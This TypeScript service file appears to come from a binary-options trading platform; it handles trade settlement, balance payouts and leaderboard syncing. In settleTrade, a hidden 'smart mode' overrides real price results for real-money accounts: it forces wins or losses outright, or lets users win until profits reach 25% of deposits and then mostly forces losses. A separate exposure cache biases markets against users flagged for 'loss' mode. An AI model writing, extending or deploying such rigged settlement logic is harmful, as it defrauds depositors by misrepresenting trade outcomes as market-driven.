import { get, query, run, transaction } from '../db/mysql-db.ts';
import { markets_real, markets_demo, userManipulationCache } from './marketService.ts';
import Big from 'big.js';
import { getIO } from './socketService.ts';
import { adminDb, syncUserToFirestore } from '../lib/firebase-admin.ts';
import { createAuditLog } from '../lib/audit.ts';
import logger from '../lib/logger.ts';
import { mapUserForFrontend } from '../lib/user-utils.ts';
import { updateLeaderboardStats, broadcastLeaderboards } from './leaderboardService.ts';

let isSettling = false;

// Global cache for trade exposure: pair_type -> net exposure (positive means UP trades dominate, negative means DOWN trades dominate)
export const tradeExposureCache = new Map<string, number>();
// User specific manipulation exposure: pair_type -> net exposure from users in loss/win mode
export const manipulatedExposureCache = new Map<string, number>();

export async function updateTradeExposureCache() {
  try {
    const openTrades = await query(`
      SELECT market_id, user_id, is_demo, direction, SUM(amount) as total 
      FROM trades 
      WHERE status = 'open' 
      GROUP BY market_id, user_id, is_demo, direction
    `) as any[];

    tradeExposureCache.clear();
    manipulatedExposureCache.clear();
    
    for (const row of openTrades) {
      const type = row.is_demo ? 'demo' : 'real';
      const key = `${row.market_id}_${type}`;
      const amount = parseFloat(row.total);
      
      // Update global exposure
      let current = tradeExposureCache.get(key) || 0;
      if (row.direction === 'up') {
        current += amount;
      } else {
        current -= amount;
      }
      tradeExposureCache.set(key, current);

      // Update manipulated exposure if user is in cache
      const manipulationMode = userManipulationCache.get(row.user_id);
      if (manipulationMode && manipulationMode !== 'neutral') {
        let manipCurrent = manipulatedExposureCache.get(key) || 0;
        let factor = manipulationMode === 'loss' ? -1 : 1; // if loss mode, we treat UP trade as negative bias (down)
        
        // Logical check: If user is in LOSS mode and goes UP, we want market to go DOWN.
        // So we add 'negative' bias for an UP trade.
        if (row.direction === 'up') {
          manipCurrent += (amount * factor);
        } else {
          manipCurrent -= (amount * factor);
        }
        manipulatedExposureCache.set(key, manipCurrent);
      }
    }
  } catch (err) {
    logger.error('Failed to update trade exposure cache:', err);
  }
}

export async function settleExpiredTrades() {
  if (isSettling) return;
  isSettling = true;
  let broadcastNeeded = false;
  try {
    const now = Math.floor(Date.now() / 1000);
    const expiredTrades = await query(
      'SELECT id, is_demo FROM trades WHERE status = ? AND expiry_time <= ?',
      ['open', now]
    ) as any[];

    for (const trade of expiredTrades) {
      await settleTrade(trade.id);
      if (!trade.is_demo) {
        broadcastNeeded = true;
      }
    }
    
    if (broadcastNeeded) {
      broadcastLeaderboards().catch(err => console.error('Broadcast leaderboard error:', err));
    }
  } catch (err) {
    logger.error('Failed to settle expired trades:', err);
  } finally {
    isSettling = false;
  }
}

export async function settleTrade(tradeId: number, currentMarketPrice?: number) {
  try {
    const result = await transaction(async (conn) => {
      // Lock the trade record
      const trade = await get('SELECT * FROM trades WHERE id = ?', [tradeId], conn) as any;
      if (!trade || trade.status !== 'open') return null;

      const isDemo = !!trade.is_demo;
      const marketsPool = isDemo ? markets_demo : markets_real;
      const m = marketsPool[trade.market_id];
      
      const exitPrice = currentMarketPrice !== undefined ? currentMarketPrice : (m ? m.price : parseFloat(trade.entry_price));
      const entryPrice = parseFloat(trade.entry_price);

      const diff = exitPrice - entryPrice;
      const epsilon = 0.0000000001;
      let isWin = false;
      let isDraw = Math.abs(diff) < epsilon;

      if (!isDraw) {
        if (trade.direction === 'up') {
          isWin = exitPrice > entryPrice;
        } else {
          isWin = exitPrice < entryPrice;
        }
      }

      const tradeAmount = new Big(trade.amount);

      // Check user Smart Mode settings (Broker Smart Control Mode)
      if (!isDemo) {
        const smartUser = await get('SELECT smart_mode_enabled, smart_mode_strategy FROM users WHERE uid = ?', [trade.user_id], conn) as any;
        if (smartUser && smartUser.smart_mode_enabled) {
          const strategy = smartUser.smart_mode_strategy || 'auto_25_percent';
          if (strategy === 'force_win') {
            isWin = true;
            isDraw = false;
          } else if (strategy === 'force_loss') {
            isWin = false;
            isDraw = false;
          } else if (strategy === 'auto_25_percent') {
            const depositSum = await get('SELECT SUM(amount) as total FROM transactions WHERE user_id = ? AND type = \'deposit\' AND status = \'completed\'', [trade.user_id], conn) as any;
            const totalDeposit = parseFloat(depositSum?.total || 0);
            
            const profitSum = await get('SELECT SUM(CASE WHEN status = \'won\' THEN (payout_amount - amount) ELSE -amount END) as net_profit FROM trades WHERE user_id = ? AND is_demo = 0 AND status IN (\'won\', \'lost\')', [trade.user_id], conn) as any;
            const netProfit = parseFloat(profitSum?.net_profit || 0);

            const targetProfit = totalDeposit * 0.25; // 25% profit of total deposits
            if (netProfit < targetProfit) {
              isWin = true;
              isDraw = false;
            } else {
              if (tradeAmount.gt(50) || Math.random() < 0.75) {
                isWin = false;
                isDraw = false;
              }
            }
          }
        }
      }

      let newStatus = 'lost';
      let payoutAmount = new Big(0);

      if (isWin) {
        newStatus = 'won';
        const payoutPercent = m ? (m.payout || 82) : 80;
        const profit = tradeAmount.times(payoutPercent).div(100);
        payoutAmount = tradeAmount.plus(profit);
      } else if (isDraw) {
        newStatus = 'draw';
        payoutAmount = tradeAmount;
      }

      // Update trade in SQL
      await run(
        'UPDATE trades SET status = ?, exit_price = ?, payout_amount = ?, settled_at = ? WHERE id = ?',
        [newStatus, exitPrice.toString(), payoutAmount.toFixed(2), Math.floor(Date.now() / 1000), tradeId],
        conn
      );

      // Sync trade settlement to Firestore
      if (adminDb) {
        try {
          logger.info(`Attempting to sync trade ${tradeId} settlement to Firestore. New status: ${newStatus}`);
          await adminDb.collection('trades').doc(tradeId.toString()).update({
            status: newStatus,
            exitPrice: parseFloat(exitPrice.toString()),
            payoutAmount: payoutAmount.toNumber(),
            settledAt: Math.floor(Date.now() / 1000)
          });
          logger.info(`Successfully synced trade ${tradeId} settlement to Firestore.`);
        } catch (fsErr: any) {
          logger.error(`Failed to sync trade ${tradeId} settlement to Firestore: ${fsErr.message}`);
          // Fallback: Try to sync full trade object if update failed (document might not exist)
          try {
            const fullTrade = await get('SELECT * FROM trades WHERE id = ?', [tradeId], conn) as any;
            if (fullTrade) {
              const mapped = {
                id: fullTrade.id.toString(),
                userId: fullTrade.user_id,
                marketId: fullTrade.market_id,
                asset: fullTrade.market_id,
                amount: parseFloat(fullTrade.amount),
                direction: fullTrade.direction,
                type: fullTrade.direction,
                entryPrice: parseFloat(fullTrade.entry_price),
                exitPrice: parseFloat(exitPrice.toString()),
                status: newStatus,
                payoutAmount: payoutAmount.toNumber(),
                duration: fullTrade.duration,
                expiryTime: fullTrade.expiry_time,
                accountType: fullTrade.account_type,
                isDemo: !!fullTrade.is_demo,
                createdAt: fullTrade.created_at,
                settledAt: Math.floor(Date.now() / 1000)
              };
              await adminDb.collection('trades').doc(tradeId.toString()).set(mapped);
            }
          } catch (e) {}
        }
      }

      // Update user balance if payout > 0
      if (payoutAmount.gt(0)) {
        if (trade.account_type === 'tournament' && trade.tournament_id) {
           const participant = await get('SELECT score FROM tournament_participants WHERE tournament_id = ? AND user_id = ?', [trade.tournament_id, trade.user_id], conn) as any;
           if (participant) {
             const currentBalance = new Big(participant.score || 0);
             const newBalance = currentBalance.plus(payoutAmount).toFixed(2);
             await run(`UPDATE tournament_participants SET score = ? WHERE tournament_id = ? AND user_id = ?`, [newBalance, trade.tournament_id, trade.user_id], conn);
             
             // Sync updated score to Firestore
             const { syncTournamentScoreToFirestore } = await import('../lib/firebase-admin.ts');
             syncTournamentScoreToFirestore(trade.tournament_id, trade.user_id, parseFloat(newBalance)).catch(err => logger.error('Sync tournament score failed on payout:', err));
           }
        } else {
           const balanceField = (trade.is_demo || trade.account_type === 'demo') ? 'demo_balance' : 'real_balance';
           // Lock user record
           const user = await get('SELECT ' + balanceField + ' FROM users WHERE uid = ?', [trade.user_id], conn) as any;
           if (user) {
               const currentBalance = new Big(user[balanceField] || 0);
               const newBalance = currentBalance.plus(payoutAmount).toFixed(2);
               await run(`UPDATE users SET ${balanceField} = ? WHERE uid = ?`, [newBalance, trade.user_id], conn);
               
               // Sync to Firestore immediately and notify UI
               try {
                 const { syncUserToFirestore } = await import('../lib/firebase-admin.ts');
                 const { mapUserForFrontend } = await import('../lib/user-utils.ts');
                 const updatedUser = await get('SELECT * FROM users WHERE uid = ?', [trade.user_id], conn) as any;
                 const mapped = mapUserForFrontend(updatedUser);
                 syncUserToFirestore(trade.user_id, mapped).catch(err => logger.error('Sync user balance failed on payout:', err));
               
                 // Emit socket event for real-time UI update
                 const { getIO } = await import('./socketService.ts');
                 getIO().to(`user_${trade.user_id}`).emit('user_profile_update', mapped);
               } catch (e) {
                 logger.error('Failed to sync/emit balance update:', e);
               }
               
               if (!trade.is_demo && trade.account_type !== 'demo' && trade.account_type !== 'tournament') {
                 await createAuditLog(trade.user_id, 'trade_payout', 'trade', tradeId.toString(), { payoutAmount: payoutAmount.toNumber(), newBalance });
               }
           }
        }
      }

      if (!trade.is_demo && trade.account_type !== 'demo' && trade.account_type !== 'tournament') {
        const profit = payoutAmount.minus(tradeAmount).toNumber();
        await updateLeaderboardStats(trade.user_id, newStatus as any, profit, tradeAmount.toNumber(), conn);
      }

      const fullTrade = await get('SELECT * FROM trades WHERE id = ?', [tradeId], conn) as any;

      return { 
        id: tradeId, 
        status: newStatus, 
        exitPrice, 
        payoutAmount: payoutAmount.toNumber(), 
        userId: trade.user_id,
        isDemo,
        accountType: trade.account_type,
        asset: trade.market_id,
        direction: trade.direction,
        type: trade.direction,
        amount: parseFloat(trade.amount),
        entryPrice: parseFloat(trade.entry_price),
        createdAt: trade.created_at,
        settledAt: Math.floor(Date.now() / 1000),
        payoutRate: m ? (m.payout || 82) : 80
      };
    });

    if (result) {
      const io = getIO();
      // Notify user via socket
      io.to(`user_${result.userId}`).emit('trade_settled', result);
      // Also notify balance update
      const user = await get('SELECT * FROM users WHERE uid = ?', [result.userId]) as any;
      const mapped = mapUserForFrontend(user);
      io.to(`user_${result.userId}`).emit('user_profile_update', mapped);
      syncUserToFirestore(result.userId, mapped);
    }

    return result;
  } catch (err) {
    console.error('Settlement error:', err);
    return null;
  }
}

